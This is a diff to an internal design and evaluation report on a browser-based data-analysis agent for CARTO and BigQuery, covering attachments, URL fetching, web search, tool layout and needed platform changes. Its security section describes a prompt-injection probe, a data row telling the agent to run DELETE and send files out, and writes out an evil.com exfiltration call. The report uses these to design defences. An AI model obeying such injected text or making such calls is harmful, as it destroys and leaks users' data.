@@ -15,6 +15,18 @@ There are real limits, and they shape the architecture:
 None of these needs a VM per user. Two need server-side *configuration* (a BigQuery quota, a scoped token); none
 needs server-side *compute*.
 
+**What later experiments changed** (§5–§6):
+- **The warehouse is the analysis engine.** A single `run_sql` tool (rows into context) was as accurate as the full
+  files + DuckDB + Python stack, with 5–16× fewer tokens and ~2× faster. The in-browser file system, DuckDB and
+  Python are opt-in extras for large or non-SQL analysis, not the core. A shell (just-bash) wasn't needed at all.
+- **Images, Excel uploads and user-given URLs work without a server or a file system:**
+  - images go into the conversation;
+  - spreadsheets are parsed in the browser into a small attachment store;
+  - URLs are fetched directly when CORS allows, through a Gemini page reader when it doesn't, or imported into
+    the warehouse by CARTO's Imports API.
+- **Web search works** through a separate grounded-Gemini call via the same proxy. It is optional: slow (8–30 s)
+  and sometimes wrong.
+
 App: `https://workspace-gcp-us-east1.app.carto.com/app/client-side-agent-eval/` (private).
 Evidence: `eval-results/` (full run logs) and `tests/*/FINDINGS.md` (per-component detail).
 
@@ -183,6 +195,75 @@ significance"):
   sessions.
 - Fewer tools in the default set means fewer schema tokens on every step.
 
+### Attachments: images and Excel (demo 8)
+Uploads go into an in-memory **attachment store** (no shell, no file system):
+- spreadsheets are parsed with SheetJS;
+- images are sent to the model as image parts.
+
+All 5 models accept image input through LiteLLM. Claude costs ~30–800 prompt tokens per image, Gemini ~1,100.
+
+| Task | Model | Input / output tokens | Steps | Wall time | Correct? |
+|---|---|---|---|---|---|
+| "What's wrong with this chart?" (PNG) | opus-5.5 (all 3 harnesses) | 9.8–11.6k / 1.2k | 3 | 17–22 s | ✅ truncated axis + missing month; checked the bars against BigQuery |
+| | gemini-3.1-pro | 2.6k / 0.7k | 1 | 8 s | ✅ |
+| | sonnet-5 | 7.5k / 0.9k | 2 | 14 s | ⚠️ found 1 of 2 flaws |
+| Excel targets vs BigQuery actuals, warehouse join | opus-5.5 / gemini-3.1-pro / sonnet-5 | 5–16k / 2k | 3–5 | 13–25 s | ✅ all named the 8 countries that missed target |
+| Same, local DuckDB join | opus-5.5 / gemini-3.1-pro / sonnet-5 | 6.5–47k / 1.5–3.3k | 4–12 | 16–44 s | ✅, but more steps and tokens |
+| Agent captures its own chart and looks at it | opus-5.5 | 11.6k / 11.7k | 3 | 17 s | ✅ |
+
+**Joining an upload with warehouse data:**
+- For **small sheets**, models simply read the sheet and inline the values into SQL. Opus didn't even need to
+  upload.
+- Otherwise **uploading to the warehouse** (`CREATE TABLE … AS SELECT FROM UNNEST(...)` into the viewer's private
+  dataset, `agent_tmp_*` prefix, 24 h expiry) takes 1.6–6 s and was cheaper than the DuckDB path. It is limited by
+  BigQuery's 1 MB query text (~20k narrow rows). Bigger files need the signed-upload import (~20 s).
+- **The local DuckDB join** works, but costs more steps (Sonnet: 12 steps, 47k tokens). Keep it for when the
+  warehouse must not be written to.
+
+**Images returned by tools** (the agent screenshots a chart or map and inspects it):
+- LiteLLM accepts images inside tool messages.
+- **AI SDK** needs a flag to send them; without it the image is pasted into the tool message as base64 text.
+- **OpenAI Agents JS** drops them, so we re-inject them as a user message.
+- **The hand-rolled loop** injects a follow-up user message with the image.
+
+### User-given URLs and web search (demos 8–9)
+**Fetching a URL.** Most real data URLs allow browser fetches (CORS `*`): GitHub raw, Socrata/NYC open data, INE
+API and CSV downloads, World Bank API, Google Sheets CSV export. Most HTML pages and some portals don't. So
+`fetch_url` tries three paths:
+
+| Path | When | Measured |
+|---|---|---|
+| Direct browser fetch → attachment (schema + sample to the model) | CORS allowed | INE CSV: fetched in 1.4 s, task 13 s |
+| Gemini `urlContext` sub-call (via LiteLLM) | CORS-blocked HTML | Worldometer table: 6–10 s, ~16k tokens; extraction correct |
+| CARTO Imports API from URL (`POST /v3/imports {url}`) → warehouse table → `run_sql` | Large or blocked data files (≤ 5 GB, CSV/geo formats) | Census CSV: 17–19 s; top 3 exact |
+
+Gemini's page reader **fails dangerously**: when retrieval failed it returned invented "content" (rambling text).
+The tool now errors unless Gemini reports `URL_RETRIEVAL_STATUS_SUCCESS`. It also can't read big data files (a
+large CSV exceeded its 1M-token context). Login-protected URLs can't be fetched; the user downloads and uploads
+them instead.
+
+**Web search.**
+- **Claude's built-in search is blocked:** CARTO's Vertex project disallows it by org policy
+  (`constraints/vertexai.allowedPartnerModelFeatures`).
+- **Gemini's Google Search works through LiteLLM, but is silently dropped when function tools are in the same
+  request** (the model then says it has no search tool). So `web_search` is a *separate* Gemini call with only
+  `googleSearch`, returning a sourced answer and links. Any main model, Claude included, can call it.
+
+Task: top-8 user countries vs population from the web.
+
+| Main model | Steps | Input tokens | Wall time | Web calls |
+|---|---|---|---|---|
+| opus-5.5 | 6 | 9.3k | 114 s | 2 searches + 2 page reads (8–30 s each); also caught "Brasil" in the data |
+| sonnet-5 | 3 | 4.1k | 37 s | 1 search (10 s) |
+| gemini-3.1-pro | 3 | 2.8k | 34 s | 1 search (8 s) |
+
+All three agreed (South Korea ~2.5× over-represented, China ~0.6×) and cited Worldometer. Caveats:
+- **Latency:** 8–30 s per search.
+- **Accuracy:** grounded answers can still be wrong. One test placed the "2026 Bahrain GP" in Malaysia.
+- **Data leaves the org:** search queries go to Google.
+
+Recommendation: optional, off by default for sensitive deployments.
+
 **Harness comparison** (demo 3, claude-sonnet-5, same prompt):
 
 | Harness | Steps | Input / output tokens | Wall time | Own bundle (gzip) | LOC |
@@ -239,6 +320,22 @@ Harness notes:
   MCP the same token reaches `delete`, `manage_*` and `admin_carto`.
 - Our client-side guard and MCP tool denylist block these. But a client-side filter is only a mitigation.
 
+**How this compares to a coding agent like Claude Code.** Same class of risk — an agent reads untrusted text
+(data, web pages, uploads) that can try to steer it into misusing its tools — with a different shape:
+- **Smaller blast radius than Claude Code.** The browser sandbox has no shell, local files or SSH keys. The agent's
+  reach is the CARTO token plus the page's network calls.
+- **No human approving actions.** Claude Code's main defence is permission prompts reviewed by a technical user. A
+  data chatbot runs tools automatically, for non-technical users, over content written by outsiders (customer
+  text, web results, pasted URLs), and the organisation deploys it on behalf of many people.
+- **An over-powered credential.** The chatbot needs read access, but the viewer token can write and administer.
+
+**The model to copy is Claude Code's, adapted to non-technical users:**
+- reads run automatically (`run_sql`, fetches of URLs the user provided);
+- anything with side effects asks first — warehouse writes and imports, or contacting a domain the user didn't
+  give (the `fetch_url("https://evil.com/?d=<data>")` exfiltration path);
+- hard limits are enforced server-side through scoped tokens and a read-only SQL flag, because the client-side
+  guards are only mitigations.
+
 **Prompt injection from data** (probe: a "customer review" row instructing the agent to run a `DELETE` and send
 the files to an external URL; one trial per model):
 
@@ -280,26 +377,31 @@ entirely and makes per-user isolation the default instead of something to engine
 ```
 CARTO Hosted App (static, org login)
  └─ browser
-     ├─ agent loop (thin; AI SDK or ~120-line loop) ── LiteLLM (viewer token)
-     ├─ tools
-     │   ├─ run_sql ── CARTO SQL API ── BigQuery → small result into context   ← DEFAULT (see §5 ablation)
-│   ├─ bq_query ── CARTO SQL API (viewer token) ── BigQuery   → Parquet in VFS (schema+sample to model)
-     │   ├─ duckdb_query (DuckDB-WASM worker)  ← for large pulls / iterative slicing
-     │   ├─ run_python (Pyodide worker, prewarmed) ← stats / modelling
-     │   ├─ render_chart (Vega-Lite, validated)
+     ├─ agent loop (thin: AI SDK or a ~120-line loop) ── LiteLLM (viewer token)
+     ├─ default tools (auto-run, read-only)
+     │   ├─ run_sql ── CARTO SQL API ── BigQuery → small result into context   ← the analysis engine
+     │   ├─ attachments: list / read (Excel via SheetJS, CSV) + images as image parts
+     │   ├─ fetch_url: direct (CORS) → Gemini urlContext (HTML) → Imports API (big files)
+     │   ├─ render_chart (Vega-Lite, validated) + capture_chart (agent sees its own chart)
      │   └─ mcp__<allowlisted> ── CARTO MCP (curated Workflows only)
-     └─ VFS (just-bash InMemoryFs) shared by all tools
+     ├─ confirm-first tools (side effects)
+     │   ├─ upload_to_warehouse / import_url_to_warehouse (agent_tmp_*, 24 h expiry)
+     │   └─ fetch of a domain the user didn't provide
+     └─ opt-in tools (lazy-loaded)
+         ├─ web_search (grounded Gemini sub-call)
+         ├─ bq_query → Parquet + duckdb_query (large pulls, many iterations, no-write joins)
+         └─ run_python (Pyodide; non-SQL analysis)
 Server-side *configuration* (no compute):
  ├─ BigQuery custom quota / bytes cap on the connection's billing project
  ├─ least-privilege connection (read-only service account), or named sources only
- └─ (ask CARTO) scoped viewer tokens per app: APIs + connections + MCP tool allowlist
+ └─ (ask CARTO) app-scoped viewer tokens: APIs + connections + read-only SQL + MCP tool allowlist
 ```
 
 **Product defaults:**
-- **Agent loop:** DuckDB-first; Python lazy and prewarmed.
-- **Context:** a tool-output cap (8k chars); a step cap; a "summarize and stop" turn when the cap is near, to avoid
-  the Gemini Flash failure.
+- **Loop limits:** an 8k-char tool-output cap; a step cap with a forced "summarize and stop" turn near the cap.
 - **Caching:** prompt caching enabled for Claude.
+- **Python:** loaded only on first `run_python`.
+- **Web search:** off unless the deployment enables it.
 
 ## 9. Open risks and next steps
 
@@ -326,3 +428,44 @@ Server-side *configuration* (no compute):
 8. **Evidence is thin on variance:** one run per model/demo. Run 5–10 trials before choosing a default model.
 9. **Device variance:** all numbers are from a desktop-class headless Chromium. Low-end laptops and mobile will
    have less memory and slower wasm; the ~14 s Python cold start may roughly double.
+
+## 10. What CARTO would need to add
+
+Prioritised; each item came up in a test above.
+
+1. **App-scoped tokens and a server-side read-only mode.** `carto.json` would declare APIs, connections, read-only
+   SQL (rejecting DML and multi-statement scripts) and an MCP tool allowlist. Today the viewer token can write and
+   call admin and delete tools, and our guards are client-side heuristics.
+2. **Cost controls in the SQL API:**
+   - honour `maximumBytesBilled`;
+   - a working dry run (bytes estimate);
+   - per-app and per-user BigQuery budgets.
+3. **LiteLLM:**
+   - Claude prompt caching (0% today vs ~80% on Gemini);
+   - a per-team `/models` list that matches what is callable;
+   - per-app usage attribution and token budgets;
+   - enable `claude-sonnet-5.5`;
+   - allow Claude web search/fetch on the Vertex project;
+   - keep Gemini `googleSearch` when function tools are present.
+4. **A first-party fetch-URL / web-search endpoint** (CORS-enabled, logged, domain policies): one reliable path
+   for raw content (HTML, PDF, CSV) instead of three fallbacks and a Gemini detour.
+5. **Per-app scratch space in the warehouse:** a temp dataset with expiry for uploads and imports (the Imports API
+   has no expiry option today), with writes confined there server-side.
+6. **MCP:**
+   - correct `readOnlyHint` / `destructiveHint` annotations (today `destructiveHint` is on everything);
+   - a server-side tool allowlist;
+   - expose `mcp-session-id` and allow `last-event-id` for future-proofing.
+7. **SQL API fidelity:**
+   - an explicit truncation flag instead of a silent 200k cut;
+   - exact types (INT64, DATE vs TIMESTAMP);
+   - a cheap catalog/describe endpoint (INFORMATION_SCHEMA lookups are billed ≥ 10 MB each).
+8. **Hosted Apps:**
+   - run the secret scan on every `deploy`;
+   - CARTO-hosted DuckDB/Pyodide assets (or a documented CSP that allows jsDelivr);
+   - an opt-in COOP/COEP setting;
+   - token refresh without a redirect.
+9. **An `@carto/agent` kit:** these tools, guards, the confirm-first pattern and the run log, so every hosted app
+   doesn't rebuild them.
+
+Deliberately *not* on the list: better bulk export to files. The ablation showed the warehouse-first pattern
+rarely needs it.
